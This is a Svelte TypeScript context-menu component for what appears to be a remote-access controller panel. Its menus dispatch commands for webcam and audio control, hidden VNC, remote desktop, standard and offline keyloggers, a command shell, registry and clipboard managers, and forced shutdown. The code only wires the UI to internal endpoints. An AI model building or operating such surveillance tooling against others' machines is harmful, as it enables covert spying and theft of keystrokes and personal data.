<script lang="ts">
	import {
		ContextMenuContent,
		ContextMenuGroup,
		ContextMenuItem,
		ContextMenuSeparator,
		ContextMenuSub,
		ContextMenuSubContent,
		ContextMenuSubTrigger
	} from '$lib/components/ui/context-menu/index.js';
	import { goto, invalidateAll } from '$app/navigation';
	import { resolve } from '$app/paths';
	import { browser } from '$app/environment';
	import type { Client } from '$lib/data/clients';
	import ClientToolDialog from '$lib/components/client-tool-dialog.svelte';
	import {
		buildClientToolUrl,
		getClientTool,
		isDialogTool,
		type ClientToolId,
		type DialogToolId
	} from '$lib/data/client-tools';
	import { isWorkspaceTool } from '$lib/data/client-tool-workspaces';
	import { notifyToolActivationCommand } from '$lib/utils/agent-commands.js';
	import type {
		AgentConnectionAction,
		AgentConnectionRequest
	} from '../../../../shared/types/agent';
	import { toast } from 'svelte-sonner';
	import type { AgentControlCommandPayload, CommandInput } from '../../../../shared/types/messages';

	const { client, onConnectionAction } = $props<{
		client: Client;
		onConnectionAction?: (detail: {
			action: AgentConnectionAction;
			success: boolean;
			message: string;
		}) => void;
	}>();

	let dialogTool = $state<DialogToolId | null>(null);

	type PowerAction = Extract<
		AgentControlCommandPayload['action'],
		'shutdown' | 'restart' | 'sleep' | 'logoff'
	>;

	const powerToolIds = new Set<ClientToolId>(['shutdown', 'restart', 'sleep', 'logoff']);

	const powerActionMeta: Record<PowerAction, { label: string; noun: string }> = {
		shutdown: { label: 'Shutdown', noun: 'shutdown' },
		restart: { label: 'Restart', noun: 'restart' },
		sleep: { label: 'Sleep', noun: 'sleep' },
		logoff: { label: 'Logoff', noun: 'log off' }
	};

	async function handleConnectionAction(action: AgentConnectionAction) {
		if (!browser) {
			return;
		}

		const label = client.hostname?.trim() || client.codename || client.id;

		try {
			const response = await fetch(`/api/agents/${client.id}/connection`, {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({ action } satisfies AgentConnectionRequest)
			});

			if (!response.ok) {
				const message = (await response.text()) || 'Unable to update connection';
				onConnectionAction?.({
					action,
					success: false,
					message: message.trim()
				});
				console.warn('Connection request failed:', message);
				return;
			}

			await invalidateAll();

			const successMessage =
				action === 'disconnect'
					? `${label} is now disconnected from the controller.`
					: `${label} has been reconnected to the controller.`;

			onConnectionAction?.({
				action,
				success: true,
				message: successMessage
			});
		} catch (err) {
			const message = err instanceof Error ? err.message : 'Unable to update connection';
			onConnectionAction?.({ action, success: false, message });
			console.error('Connection request failed:', err);
		}
	}

	async function handlePowerAction(action: PowerAction) {
		if (!browser) {
			return;
		}

		const { label, noun } = powerActionMeta[action];
		const agentLabel = client.hostname?.trim() || client.codename || client.id;

		if (client.status !== 'online') {
			toast.error(`${label} unavailable`, {
				description: `${agentLabel} is not currently connected.`,
				position: 'bottom-right'
			});
			return;
		}

		const request: CommandInput = {
			name: 'agent-control',
			payload: {
				action,
				force: true
			} satisfies AgentControlCommandPayload
		};

		try {
			const response = await fetch(`/api/agents/${client.id}/commands`, {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify(request)
			});

			if (!response.ok) {
				const detail = (await response.text().catch(() => ''))?.trim();
				toast.error(`${label} failed`, {
					description: detail || 'Failed to queue command.',
					position: 'bottom-right'
				});
				return;
			}

			await invalidateAll();

			toast.success(`${label} command sent`, {
				description: `Forced ${noun} command queued for ${agentLabel}.`,
				position: 'bottom-right'
			});
		} catch (err) {
			const message = err instanceof Error ? err.message : 'Failed to queue command.';
			toast.error(`${label} failed`, {
				description: message,
				position: 'bottom-right'
			});
		}
	}

	function openTool(toolId: ClientToolId) {
		const tool = getClientTool(toolId);
		const target = tool.target ?? '_blank';

		if (toolId === 'reconnect' || toolId === 'disconnect') {
			dialogTool = null;
			void handleConnectionAction(toolId);
			return;
		}

		if (powerToolIds.has(toolId)) {
			dialogTool = null;
			void handlePowerAction(toolId as PowerAction);
			return;
		}

		if (browser) {
			notifyToolActivationCommand(client.id, toolId, {
				action: 'open',
				metadata: { surface: 'context-menu' }
			});
		}

		if (isWorkspaceTool(toolId)) {
			dialogTool = null;
			const url = buildClientToolUrl(client.id, tool);
			if (browser) {
				goto(resolve(url as any));
			}
			return;
		}

		if (target === 'dialog') {
			dialogTool = isDialogTool(toolId) ? toolId : (toolId as DialogToolId);
			return;
		}

		dialogTool = null;

		const url = buildClientToolUrl(client.id, tool);

		if (!browser) return;

		if (target === '_self') {
			goto(resolve(url as any));
			return;
		}

		window.open(resolve(url as any), target, 'noopener,noreferrer');
	}

	function handleDialogClose() {
		dialogTool = null;
	}
</script>

<ContextMenuContent class="w-64">
	<ContextMenuGroup>
		<ContextMenuItem onSelect={() => openTool('system-info')}>System Info</ContextMenuItem>
		<ContextMenuItem onSelect={() => openTool('notes')}>Notes</ContextMenuItem>
	</ContextMenuGroup>

	<ContextMenuSeparator />

	<ContextMenuGroup>
		<ContextMenuSub>
			<ContextMenuSubTrigger>Control</ContextMenuSubTrigger>
			<ContextMenuSubContent class="w-48">
				<ContextMenuItem onSelect={() => openTool('app-vnc')}>App VNC</ContextMenuItem>
				<ContextMenuItem onSelect={() => openTool('remote-desktop')}
					>Remote Desktop</ContextMenuItem
				>
				<ContextMenuItem onSelect={() => openTool('webcam-control')}
					>Webcam Control</ContextMenuItem
				>
				<ContextMenuItem onSelect={() => openTool('audio-control')}>Audio Control</ContextMenuItem>
				<ContextMenuSub>
					<ContextMenuSubTrigger>Keylogger</ContextMenuSubTrigger>
					<ContextMenuSubContent class="w-48">
						<ContextMenuItem onSelect={() => openTool('keylogger-standard')}
							>Standard</ContextMenuItem
						>
						<ContextMenuItem onSelect={() => openTool('keylogger-offline')}
							>Offline</ContextMenuItem
						>
					</ContextMenuSubContent>
				</ContextMenuSub>
				<ContextMenuItem onSelect={() => openTool('cmd')}>CMD</ContextMenuItem>
			</ContextMenuSubContent>
		</ContextMenuSub>
	</ContextMenuGroup>

	<ContextMenuGroup>
		<ContextMenuSub>
			<ContextMenuSubTrigger>Management</ContextMenuSubTrigger>
			<ContextMenuSubContent class="w-48">
				<ContextMenuItem onSelect={() => openTool('file-manager')}>File Manager</ContextMenuItem>
				<ContextMenuItem onSelect={() => openTool('system-monitor')}
					>System Monitor</ContextMenuItem
				>
				<ContextMenuItem onSelect={() => openTool('registry-manager')}
					>Registry Manager</ContextMenuItem
				>
				<ContextMenuItem onSelect={() => openTool('clipboard-manager')}
					>Clipboard Manager</ContextMenuItem
				>
			</ContextMenuSubContent>
		</ContextMenuSub>
	</ContextMenuGroup>

	<ContextMenuSeparator />

	<ContextMenuGroup>
		<ContextMenuItem onSelect={() => openTool('recovery')}>Recovery</ContextMenuItem>
		<ContextMenuItem onSelect={() => openTool('options')}>Options</ContextMenuItem>
	</ContextMenuGroup>

	<ContextMenuSeparator />

	<ContextMenuGroup>
		<ContextMenuSub>
			<ContextMenuSubTrigger>Miscellaneous</ContextMenuSubTrigger>
			<ContextMenuSubContent class="w-48">
				<ContextMenuItem onSelect={() => openTool('open-url')}>Open URL</ContextMenuItem>
				<ContextMenuItem onSelect={() => openTool('client-chat')}>Client Chat</ContextMenuItem>
				<ContextMenuItem onSelect={() => openTool('trigger-monitor')}
					>Trigger Monitor</ContextMenuItem
				>
				<ContextMenuItem onSelect={() => openTool('ip-geolocation')}
					>IP Geolocation</ContextMenuItem
				>
				<ContextMenuItem onSelect={() => openTool('environment-variables')}
					>Environment Variables</ContextMenuItem
				>
			</ContextMenuSubContent>
		</ContextMenuSub>
	</ContextMenuGroup>

	<ContextMenuGroup>
		<ContextMenuSub>
			<ContextMenuSubTrigger>System Controls</ContextMenuSubTrigger>
			<ContextMenuSubContent class="w-48">
				<ContextMenuItem onSelect={() => openTool('reconnect')}>Reconnect</ContextMenuItem>
				<ContextMenuItem onSelect={() => openTool('disconnect')}>Disconnect</ContextMenuItem>
			</ContextMenuSubContent>
		</ContextMenuSub>
	</ContextMenuGroup>

	<ContextMenuGroup>
		<ContextMenuSub>
			<ContextMenuSubTrigger>Power</ContextMenuSubTrigger>
			<ContextMenuSubContent class="w-48">
				<ContextMenuItem onSelect={() => openTool('shutdown')}>Shutdown</ContextMenuItem>
				<ContextMenuItem onSelect={() => openTool('restart')}>Restart</ContextMenuItem>
				<ContextMenuItem onSelect={() => openTool('sleep')}>Sleep</ContextMenuItem>
				<ContextMenuItem onSelect={() => openTool('logoff')}>Logoff</ContextMenuItem>
			</ContextMenuSubContent>
		</ContextMenuSub>
	</ContextMenuGroup>
</ContextMenuContent>

{#if dialogTool}
	{#key dialogTool}
		<ClientToolDialog {client} toolId={dialogTool} onClose={handleDialogClose} />
	{/key}
{/if}
